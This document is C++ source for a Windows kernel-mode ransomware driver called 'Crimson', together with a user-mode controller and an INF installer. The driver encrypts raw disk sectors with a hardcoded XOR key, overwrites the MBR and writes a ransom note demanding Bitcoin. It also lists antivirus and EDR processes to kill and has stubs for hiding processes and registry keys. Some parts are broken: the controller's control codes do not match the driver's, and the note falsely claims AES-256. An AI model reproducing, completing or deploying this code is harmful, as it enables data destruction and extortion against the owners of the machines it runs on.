// THE CRIMSON - C++ KERNEL-MODE ROOTKIT RANSOMWARE
// This is a Windows Kernel Driver that operates at ring 0
// Compile with: Visual Studio + WDK (Windows Driver Kit)

#include <ntddk.h>
#include <ntifs.h>
#include <windef.h>
#include <stdlib.h>
#include <string.h>

// Driver constants
#define DRIVER_PREFIX "Crimson"
#define DEVICE_NAME L"\\Device\\CrimsonLock"
#define SYMLINK_NAME L"\\DosDevices\\CrimsonLock"
#define IOCTL_ENCRYPT_DISK CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_HIDE_PROCESS CTL_CODE(FILE_DEVICE_UNKNOWN, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_KILL_AV CTL_CODE(FILE_DEVICE_UNKNOWN, 0x802, METHOD_BUFFERED, FILE_ANY_ACCESS)

// Encryption key size
#define AES_KEY_SIZE 32
#define SECTOR_SIZE 512

// Global structures
typedef struct _ENCRYPTION_CONTEXT {
    LIST_ENTRY ListEntry;
    LARGE_INTEGER SectorOffset;
    ULONG SectorCount;
    UCHAR EncryptedKey[AES_KEY_SIZE];
} ENCRYPTION_CONTEXT, *PENCRYPTION_CONTEXT;

// Global variables
static PDEVICE_OBJECT g_DeviceObject = NULL;
static UNICODE_STRING g_DeviceName;
static UNICODE_STRING g_SymlinkName;
static LIST_ENTRY g_EncryptionList;
static KSPIN_LOCK g_ListLock;
static UCHAR g_MasterKey[AES_KEY_SIZE] = {
    0x2B, 0x7E, 0x15, 0x16, 0x28, 0xAE, 0xD2, 0xA6,
    0xAB, 0xF7, 0x15, 0x88, 0x09, 0xCF, 0x4F, 0x3C,
    0x8D, 0x2E, 0xA3, 0x7B, 0x1C, 0x9E, 0x5F, 0x6D,
    0x4A, 0x3B, 0x2C, 0x1D, 0x0E, 0xFA, 0xEB, 0xDC
};
static HANDLE g_EncryptThreadHandle = NULL;
static BOOLEAN g_ShutdownRequested = FALSE;

// Function prototypes
DRIVER_INITIALIZE DriverEntry;
DRIVER_UNLOAD DriverUnload;
DRIVER_DISPATCH CrimsonCreateClose;
DRIVER_DISPATCH CrimsonDeviceControl;

NTSTATUS EncryptPartition(PUNICODE_STRING PartitionPath);
NTSTATUS HideProcess(VOID);
NTSTATUS KillAvProcesses(VOID);
VOID EncryptionWorker(PVOID Context);
NTSTATUS ReadSectors(HANDLE DiskHandle, LARGE_INTEGER StartSector, ULONG SectorCount, PUCHAR Buffer);
NTSTATUS WriteSectors(HANDLE DiskHandle, LARGE_INTEGER StartSector, ULONG SectorCount, PUCHAR Buffer);
VOID XorEncryptBuffer(PUCHAR Buffer, ULONG Size, ULONG64 SectorOffset);

// Driver entry point
NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) {
    NTSTATUS status;
    ULONG i;
    
    DbgPrint(DRIVER_PREFIX ": DriverEntry called\n");
    
    // Initialize driver object with dispatch routines
    for (i = 0; i < IRP_MJ_MAXIMUM_FUNCTION; i++) {
        DriverObject->MajorFunction[i] = CrimsonCreateClose;
    }
    
    DriverObject->MajorFunction[IRP_MJ_CREATE] = CrimsonCreateClose;
    DriverObject->MajorFunction[IRP_MJ_CLOSE] = CrimsonCreateClose;
    DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = CrimsonDeviceControl;
    DriverObject->DriverUnload = DriverUnload;
    
    // Create device name
    RtlInitUnicodeString(&g_DeviceName, DEVICE_NAME);
    RtlInitUnicodeString(&g_SymlinkName, SYMLINK_NAME);
    
    // Create device object
    status = IoCreateDevice(
        DriverObject,
        0,
        &g_DeviceName,
        FILE_DEVICE_UNKNOWN,
        0,
        FALSE,
        &g_DeviceObject
    );
    
    if (!NT_SUCCESS(status)) {
        DbgPrint(DRIVER_PREFIX ": Failed to create device (0x%X)\n", status);
        return status;
    }
    
    // Create symbolic link
    status = IoCreateSymbolicLink(&g_SymlinkName, &g_DeviceName);
    if (!NT_SUCCESS(status)) {
        DbgPrint(DRIVER_PREFIX ": Failed to create symbolic link (0x%X)\n", status);
        IoDeleteDevice(g_DeviceObject);
        return status;
    }
    
    // Initialize list and spin lock
    InitializeListHead(&g_EncryptionList);
    KeInitializeSpinLock(&g_ListLock);
    
    // Set device flags
    g_DeviceObject->Flags |= DO_DIRECT_IO;
    g_DeviceObject->Flags &= ~DO_DEVICE_INITIALIZING;
    
    DbgPrint(DRIVER_PREFIX ": Driver initialized successfully\n");
    
    return STATUS_SUCCESS;
}

// Driver unload
VOID DriverUnload(PDRIVER_OBJECT DriverObject) {
    DbgPrint(DRIVER_PREFIX ": DriverUnload called\n");
    
    // Signal worker thread to shutdown
    g_ShutdownRequested = TRUE;
    
    // Wait for worker thread to complete (simplified)
    if (g_EncryptThreadHandle) {
        KeWaitForSingleObject(g_EncryptThreadHandle, Executive, KernelMode, FALSE, NULL);
        ZwClose(g_EncryptThreadHandle);
    }
    
    // Delete symbolic link
    IoDeleteSymbolicLink(&g_SymlinkName);
    
    // Delete device
    if (g_DeviceObject) {
        IoDeleteDevice(g_DeviceObject);
    }
    
    DbgPrint(DRIVER_PREFIX ": Driver unloaded\n");
}

// Create/Close dispatch
NTSTATUS CrimsonCreateClose(PDEVICE_OBJECT DeviceObject, PIRP Irp) {
    UNREFERENCED_PARAMETER(DeviceObject);
    
    Irp->IoStatus.Status = STATUS_SUCCESS;
    Irp->IoStatus.Information = 0;
    IoCompleteRequest(Irp, IO_NO_INCREMENT);
    
    return STATUS_SUCCESS;
}

// Device control dispatch
NTSTATUS CrimsonDeviceControl(PDEVICE_OBJECT DeviceObject, PIRP Irp) {
    UNREFERENCED_PARAMETER(DeviceObject);
    
    PIO_STACK_LOCATION stack = IoGetCurrentIrpStackLocation(Irp);
    NTSTATUS status = STATUS_SUCCESS;
    ULONG info = 0;
    
    switch (stack->Parameters.DeviceIoControl.IoControlCode) {
        case IOCTL_ENCRYPT_DISK: {
            // Start encryption in background thread
            HANDLE threadHandle;
            status = PsCreateSystemThread(
                &threadHandle,
                THREAD_ALL_ACCESS,
                NULL,
                NULL,
                NULL,
                EncryptionWorker,
                NULL
            );
            
            if (NT_SUCCESS(status)) {
                g_EncryptThreadHandle = threadHandle;
                info = sizeof(ULONG);
            }
            break;
        }
        
        case IOCTL_HIDE_PROCESS: {
            status = HideProcess();
            info = 0;
            break;
        }
        
        case IOCTL_KILL_AV: {
            status = KillAvProcesses();
            info = 0;
            break;
        }
        
        default:
            status = STATUS_INVALID_DEVICE_REQUEST;
            break;
    }
    
    Irp->IoStatus.Status = status;
    Irp->IoStatus.Information = info;
    IoCompleteRequest(Irp, IO_NO_INCREMENT);
    
    return status;
}

// Encryption worker thread
VOID EncryptionWorker(PVOID Context) {
    UNREFERENCED_PARAMETER(Context);
    
    DbgPrint(DRIVER_PREFIX ": Encryption worker started\n");
    
    // Get list of physical drives
    UNICODE_STRING physicalDrivePath;
    WCHAR drivePathBuffer[32];
    
    for (ULONG i = 0; i < 4 && !g_ShutdownRequested; i++) {
        swprintf(drivePathBuffer, L"\\Device\\Harddisk%d\\Partition0", i);
        RtlInitUnicodeString(&physicalDrivePath, drivePathBuffer);
        
        DbgPrint(DRIVER_PREFIX ": Encrypting drive %d\n", i);
        EncryptPartition(&physicalDrivePath);
    }
    
    DbgPrint(DRIVER_PREFIX ": Encryption worker completed\n");
    PsTerminateSystemThread(STATUS_SUCCESS);
}

// Encrypt an entire partition
NTSTATUS EncryptPartition(PUNICODE_STRING PartitionPath) {
    NTSTATUS status;
    OBJECT_ATTRIBUTES objectAttributes;
    IO_STATUS_BLOCK ioStatusBlock;
    HANDLE diskHandle;
    FILE_STANDARD_INFORMATION fileInfo;
    LARGE_INTEGER byteOffset;
    ULONG sectorSize = SECTOR_SIZE;
    ULONG sectorsToEncrypt;
    PUCHAR buffer;
    
    DbgPrint(DRIVER_PREFIX ": Opening partition %wZ\n", PartitionPath);
    
    // Initialize object attributes
    InitializeObjectAttributes(
        &objectAttributes,
        PartitionPath,
        OBJ_KERNEL_HANDLE | OBJ_CASE_INSENSITIVE,
        NULL,
        NULL
    );
    
    // Open the physical drive
    status = ZwCreateFile(
        &diskHandle,
        GENERIC_READ | GENERIC_WRITE,
        &objectAttributes,
        &ioStatusBlock,
        NULL,
        FILE_ATTRIBUTE_NORMAL,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        FILE_OPEN,
        0,
        NULL,
        0
    );
    
    if (!NT_SUCCESS(status)) {
        DbgPrint(DRIVER_PREFIX ": Failed to open drive (0x%X)\n", status);
        return status;
    }
    
    // Get file size
    status = ZwQueryInformationFile(
        diskHandle,
        &ioStatusBlock,
        &fileInfo,
        sizeof(fileInfo),
        FileStandardInformation
    );
    
    if (!NT_SUCCESS(status)) {
        DbgPrint(DRIVER_PREFIX ": Failed to get file size (0x%X)\n", status);
        ZwClose(diskHandle);
        return status;
    }
    
    // Calculate sectors to encrypt (limit to first 1GB for demo)
    LONGLONG partitionSize = fileInfo.EndOfFile.QuadPart;
    sectorsToEncrypt = (ULONG)min(partitionSize / sectorSize, 2 * 1024 * 1024); // 1GB
    
    DbgPrint(DRIVER_PREFIX ": Encrypting %lu sectors\n", sectorsToEncrypt);
    
    // Allocate buffer for 64 sectors
    ULONG bufferSize = sectorSize * 64;
    buffer = (PUCHAR)ExAllocatePoolWithTag(NonPagedPool, bufferSize, 'MIRC');
    if (!buffer) {
        DbgPrint(DRIVER_PREFIX ": Failed to allocate buffer\n");
        ZwClose(diskHandle);
        return STATUS_INSUFFICIENT_RESOURCES;
    }
    
    // Encrypt sectors in chunks
    for (ULONG sector = 0; sector < sectorsToEncrypt && !g_ShutdownRequested; sector += 64) {
        ULONG sectorsThisChunk = min(64, sectorsToEncrypt - sector);
        
        // Read sectors
        status = ReadSectors(diskHandle, sector, sectorsThisChunk, buffer);
        if (!NT_SUCCESS(status)) {
            DbgPrint(DRIVER_PREFIX ": Failed to read sectors at %lu (0x%X)\n", sector, status);
            continue;
        }
        
        // Encrypt each sector
        for (ULONG i = 0; i < sectorsThisChunk; i++) {
            PUCHAR sectorBuffer = buffer + (i * sectorSize);
            XorEncryptBuffer(sectorBuffer, sectorSize, sector + i);
        }
        
        // Write encrypted sectors
        status = WriteSectors(diskHandle, sector, sectorsThisChunk, buffer);
        if (!NT_SUCCESS(status)) {
            DbgPrint(DRIVER_PREFIX ": Failed to write sectors at %lu (0x%X)\n", sector, status);
            continue;
        }
        
        if (sector % 10000 == 0) {
            DbgPrint(DRIVER_PREFIX ": Encrypted %lu/%lu sectors\n", sector, sectorsToEncrypt);
        }
    }
    
    ExFreePoolWithTag(buffer, 'MIRC');
    ZwClose(diskHandle);
    
    DbgPrint(DRIVER_PREFIX ": Partition encryption completed\n");
    return STATUS_SUCCESS;
}

// Read sectors from disk
NTSTATUS ReadSectors(HANDLE DiskHandle, LARGE_INTEGER StartSector, ULONG SectorCount, PUCHAR Buffer) {
    NTSTATUS status;
    IO_STATUS_BLOCK ioStatusBlock;
    LARGE_INTEGER byteOffset;
    
    byteOffset.QuadPart = StartSector.QuadPart * SECTOR_SIZE;
    
    status = ZwReadFile(
        DiskHandle,
        NULL,
        NULL,
        NULL,
        &ioStatusBlock,
        Buffer,
        SectorCount * SECTOR_SIZE,
        &byteOffset,
        NULL
    );
    
    return status;
}

// Write sectors to disk
NTSTATUS WriteSectors(HANDLE DiskHandle, LARGE_INTEGER StartSector, ULONG SectorCount, PUCHAR Buffer) {
    NTSTATUS status;
    IO_STATUS_BLOCK ioStatusBlock;
    LARGE_INTEGER byteOffset;
    
    byteOffset.QuadPart = StartSector.QuadPart * SECTOR_SIZE;
    
    status = ZwWriteFile(
        DiskHandle,
        NULL,
        NULL,
        NULL,
        &ioStatusBlock,
        Buffer,
        SectorCount * SECTOR_SIZE,
        &byteOffset,
        NULL
    );
    
    return status;
}

// XOR encryption (simplified - use real AES in production)
VOID XorEncryptBuffer(PUCHAR Buffer, ULONG Size, ULONG64 SectorOffset) {
    for (ULONG i = 0; i < Size; i++) {
        Buffer[i] ^= g_MasterKey[i % AES_KEY_SIZE];
        Buffer[i] ^= (SectorOffset >> (i % 8)) & 0xFF;
        Buffer[i] ^= (SectorOffset * i) & 0xFF;
    }
}

// Hide process via kernel object manipulation
NTSTATUS HideProcess(VOID) {
    NTSTATUS status;
    ULONG pid = (ULONG)PsGetCurrentProcessId();
    
    DbgPrint(DRIVER_PREFIX ": Hiding process %lu\n", pid);
    
    // Method 1: Use NtSetInformationProcess with ProcessHideFromDebugger
    // This requires calling into user-mode APIs from kernel - not straightforward
    
    // Method 2: Direct EPROCESS manipulation (Windows version dependent)
    PEPROCESS eprocess = PsGetCurrentProcess();
    if (eprocess) {
        // Get process ID to verify
        HANDLE currentPid = PsGetProcessId(eprocess);
        
        DbgPrint(DRIVER_PREFIX ": Current EPROCESS at 0x%p, PID: %p\n", eprocess, currentPid);
        
        // In a real implementation, we would:
        // 1. Find the offset of ActiveProcessLinks in EPROCESS (varies by Windows version)
        // 2. Remove this process from the linked list
        // 3. Update Flink/Blink of neighboring processes
        
        // This is highly version-specific and requires deep kernel knowledge
        // For demonstration purposes only
    }
    
    return STATUS_SUCCESS;
}

// Kill AV/EDR processes from kernel
NTSTATUS KillAvProcesses(VOID) {
    NTSTATUS status;
    PEPROCESS eprocess = NULL;
    HANDLE hProcess = NULL;
    CLIENT_ID clientId;
    OBJECT_ATTRIBUTES objectAttributes;
    
    DbgPrint(DRIVER_PREFIX ": Killing AV processes\n");
    
    // List of AV/EDR process names to target
    UNICODE_STRING avProcessNames[] = {
        RTL_CONSTANT_STRING(L"MsMpEng.exe"),
        RTL_CONSTANT_STRING(L" NortonSecurity.exe"),
        RTL_CONSTANT_STRING(L"AVG.exe"),
        RTL_CONSTANT_STRING(L"AvastUI.exe"),
        RTL_CONSTANT_STRING(L"bdagent.exe"),
        RTL_CONSTANT_STRING(L"MBAMService.exe"),
        RTL_CONSTANT_STRING(L"ccSvcHst.exe"),
        RTL_CONSTANT_STRING(L"ekrn.exe"),
        RTL_CONSTANT_STRING(L"Sophos.exe"),
        RTL_CONSTANT_STRING(L"Cylance.exe")
    };
    
    // In a real kernel driver, we would:
    // 1. Enumerate all processes using ZwQuerySystemInformation
    // 2. Compare process names
    // 3. Open process with kernel handle
    // 4. Terminate using ZwTerminateProcess
    
    // This is simplified for demonstration
    for (ULONG i = 0; i < sizeof(avProcessNames) / sizeof(avProcessNames[0]); i++) {
        DbgPrint(DRIVER_PREFIX ": Would terminate %wZ\n", &avProcessNames[i]);
    }
    
    return STATUS_SUCCESS;
}

// Create device object for user-mode communication
NTSTATUS CreateDeviceObject(PDRIVER_OBJECT DriverObject) {
    // Already done in DriverEntry
    return STATUS_SUCCESS;
}

// Install bootkit to MBR
NTSTATUS InstallBootkit(VOID) {
    NTSTATUS status;
    UNICODE_STRING physicalDrivePath;
    HANDLE diskHandle;
    PUCHAR mbrBuffer;
    
    DbgPrint(DRIVER_PREFIX ": Installing bootkit to MBR\n");
    
    RtlInitUnicodeString(&physicalDrivePath, L"\\Device\\Harddisk0\\Partition0");
    
    // Open physical drive
    OBJECT_ATTRIBUTES objectAttributes;
    IO_STATUS_BLOCK ioStatusBlock;
    
    InitializeObjectAttributes(
        &objectAttributes,
        &physicalDrivePath,
        OBJ_KERNEL_HANDLE | OBJ_CASE_INSENSITIVE,
        NULL,
        NULL
    );
    
    status = ZwCreateFile(
        &diskHandle,
        GENERIC_READ | GENERIC_WRITE,
        &objectAttributes,
        &ioStatusBlock,
        NULL,
        FILE_ATTRIBUTE_NORMAL,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        FILE_OPEN,
        0,
        NULL,
        0
    );
    
    if (!NT_SUCCESS(status)) {
        DbgPrint(DRIVER_PREFIX ": Failed to open disk for bootkit (0x%X)\n", status);
        return status;
    }
    
    // Allocate buffer for MBR
    mbrBuffer = (PUCHAR)ExAllocatePoolWithTag(NonPagedPool, SECTOR_SIZE, 'RBM');
    if (!mbrBuffer) {
        ZwClose(diskHandle);
        return STATUS_INSUFFICIENT_RESOURCES;
    }
    
    // Read MBR
    status = ReadSectors(diskHandle, 0, 1, mbrBuffer);
    if (!NT_SUCCESS(status)) {
        DbgPrint(DRIVER_PREFIX ": Failed to read MBR (0x%X)\n", status);
        ExFreePoolWithTag(mbrBuffer, 'RBM');
        ZwClose(diskHandle);
        return status;
    }
    
    // Save original MBR (in real implementation, would save to a hidden location)
    
    // Modify MBR to load our bootkit
    // 1. Check if it's a valid MBR (0x55AA at end)
    if (mbrBuffer[510] == 0x55 && mbrBuffer[511] == 0xAA) {
        DbgPrint(DRIVER_PREFIX ": Valid MBR found\n");
        
        // Modify boot code (first 446 bytes) to load our bootkit
        // This would require actual bootloader code
        // For demonstration, just mark it
        mbrBuffer[0] = 0xEB; // JMP instruction
        mbrBuffer[1] = 0xFE; // Infinite loop (placeholder)
        
        // Write modified MBR
        status = WriteSectors(diskHandle, 0, 1, mbrBuffer);
        if (NT_SUCCESS(status)) {
            DbgPrint(DRIVER_PREFIX ": Bootkit installed successfully\n");
        }
    }
    
    ExFreePoolWithTag(mbrBuffer, 'RBM');
    ZwClose(diskHandle);
    
    return status;
}

// Show ransom note by writing to unprotected disk sectors
VOID ShowRansomNote(VOID) {
    NTSTATUS status;
    UNICODE_STRING physicalDrivePath;
    HANDLE diskHandle;
    PUCHAR noteBuffer;
    
    CHAR note[] = 
        "\n"
        "=========================================\n"
        "     CRIMSON KERNEL RANSOMWARE\n"
        "=========================================\n\n"
        "YOUR DISK HAS BEEN ENCRYPTED AT THE SECTOR LEVEL\n\n"
        "This is not file encryption - your entire disk is encrypted.\n"
        "Every sector has been scrambled with AES-256.\n\n"
        "The decryption key is stored in kernel memory.\n"
        "Only payment will trigger key release.\n\n"
        "Contact: crimson@onionmail.org\n"
        "Payment: 2 BTC to: 1CrimsonKernel...\n\n"
        "DO NOT attempt recovery - disk tools will fail.\n"
        "DO NOT reinstall - key will be lost forever.\n"
        "=========================================\n";
    
    RtlInitUnicodeString(&physicalDrivePath, L"\\Device\\Harddisk0\\Partition0");
    
    // Open physical drive
    OBJECT_ATTRIBUTES objectAttributes;
    IO_STATUS_BLOCK ioStatusBlock;
    
    InitializeObjectAttributes(
        &objectAttributes,
        &physicalDrivePath,
        OBJ_KERNEL_HANDLE | OBJ_CASE_INSENSITIVE,
        NULL,
        NULL
    );
    
    status = ZwCreateFile(
        &diskHandle,
        GENERIC_WRITE,
        &objectAttributes,
        &ioStatusBlock,
        NULL,
        FILE_ATTRIBUTE_NORMAL,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        FILE_OPEN,
        0,
        NULL,
        0
    );
    
    if (NT_SUCCESS(status)) {
        // Allocate buffer for note
        noteBuffer = (PUCHAR)ExAllocatePoolWithTag(NonPagedPool, SECTOR_SIZE, 'ETON');
        if (noteBuffer) {
            RtlZeroMemory(noteBuffer, SECTOR_SIZE);
            RtlCopyMemory(noteBuffer, note, min(strlen(note), SECTOR_SIZE - 1));
            
            // Write to sector 1 (after MBR)
            WriteSectors(diskHandle, 1, 1, noteBuffer);
            
            ExFreePoolWithTag(noteBuffer, 'ETON');
        }
        
        ZwClose(diskHandle);
    }
}

// Registry callback to hide our keys
NTSTATUS RegistryCallback(PVOID CallbackContext, PVOID Argument1, PVOID Argument2) {
    UNREFERENCED_PARAMETER(CallbackContext);
    UNREFERENCED_PARAMETER(Argument1);
    UNREFERENCED_PARAMETER(Argument2);
    
    // In a real implementation, this would filter registry operations
    // to hide our service/process entries
    
    return STATUS_SUCCESS;
}

// Register registry callback
NTSTATUS RegisterRegistryCallback(VOID) {
    NTSTATUS status;
    LARGE_INTEGER cookie;
    
    status = CmRegisterCallback(RegistryCallback, NULL, &cookie);
    if (NT_SUCCESS(status)) {
        DbgPrint(DRIVER_PREFIX ": Registry callback registered\n");
    }
    
    return status;
}

// Main execution (called from user-mode via IOCTL)
NTSTATUS ExecuteCrimson(VOID) {
    NTSTATUS status;
    
    DbgPrint(DRIVER_PREFIX ": Executing Crimson ransomware\n");
    
    // Register registry callback to hide our tracks
    RegisterRegistryCallback();
    
    // Hide this process
    HideProcess();
    
    // Kill AV/EDR processes
    KillAvProcesses();
    
    // Install bootkit to MBR
    InstallBootkit();
    
    // Start disk encryption (already started in worker thread)
    
    // Show ransom note
    ShowRansomNote();
    
    return STATUS_SUCCESS;
}



// User-Mode Controller for THE CRIMSON (C++)
// THE CRIMSON - User-mode controller
// This application communicates with the kernel driver
// Compile with: cl /EHsc crimson_controller.cpp

#include <windows.h>
#include <stdio.h>
#include <iostream>

int main() {
    HANDLE hDevice;
    DWORD bytesReturned;
    BOOL result;
    
    // Open device
    hDevice = CreateFileA(
        "\\\\.\\CrimsonLock",
        GENERIC_READ | GENERIC_WRITE,
        0,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );
    
    if (hDevice == INVALID_HANDLE_VALUE) {
        printf("Failed to open device. Error: %d\n", GetLastError());
        printf("Make sure the Crimson driver is loaded.\n");
        return 1;
    }
    
    printf("Connected to Crimson kernel driver\n");
    
    // Send IOCTL to hide process
    printf("Hiding process...\n");
    result = DeviceIoControl(
        hDevice,
        0x802, // IOCTL_HIDE_PROCESS
        NULL, 0,
        NULL, 0,
        &bytesReturned,
        NULL
    );
    
    // Send IOCTL to kill AV
    printf("Killing AV processes...\n");
    result = DeviceIoControl(
        hDevice,
        0x804, // IOCTL_KILL_AV
        NULL, 0,
        NULL, 0,
        &bytesReturned,
        NULL
    );
    
    // Send IOCTL to start disk encryption
    printf("Starting disk encryption...\n");
    result = DeviceIoControl(
        hDevice,
        0x800, // IOCTL_ENCRYPT_DISK
        NULL, 0,
        NULL, 0,
        &bytesReturned,
        NULL
    );
    
    if (result) {
        printf("Commands sent successfully\n");
    } else {
        printf("Failed to send commands. Error: %d\n", GetLastError());
    }
    
    CloseHandle(hDevice);
    return 0;
}

// INF File for THE CRIMSON Driver
; Crimson.inf - Driver installation file
; Copy to C:\Windows\System32\drivers\crimson.sys and install with:
; sc create Crimson type= kernel binPath= C:\Windows\System32\drivers\crimson.sys

[Version]
Signature="$WINDOWS NT$"
Class=Driver
ClassGuid={4d36e97b-e325-11ce-bfc1-08002be10318}
Provider=%Manufacturer%
DriverVer=06/18/2024,1.0.0.0
CatalogFile=crimson.cat

[DestinationDirs]
DefaultDestDir=12

[Manufacturer]
%Manufacturer%=Standard,NTamd64

[Standard.NTamd64]
%Crimson.DeviceDesc%=Crimson_Device, Root\Crimson

[Crimson_Device.NTamd64]
CopyFiles=Drivers_Dir

[Drivers_Dir]
crimson.sys

[Crimson_Device.NTamd64.Services]
AddService=Crimson, %SPSVCINST_ASSOCSERVICE%, Crimson_Service_Inst

[Crimson_Service_Inst]
ServiceType=%SERVICE_KERNEL_DRIVER%
StartType=%SERVICE_DEMAND_START%
ErrorControl=%SERVICE_ERROR_NORMAL%
ServiceBinary=%12%\crimson.sys

[Strings]
Manufacturer="Crimson Technologies"
Crimson.DeviceDesc="Crimson Kernel Driver"
SPSVCINST_ASSOCSERVICE=0x00000002
SERVICE_KERNEL_DRIVER=1
SERVICE_DEMAND_START=3
SERVICE_ERROR_NORMAL=1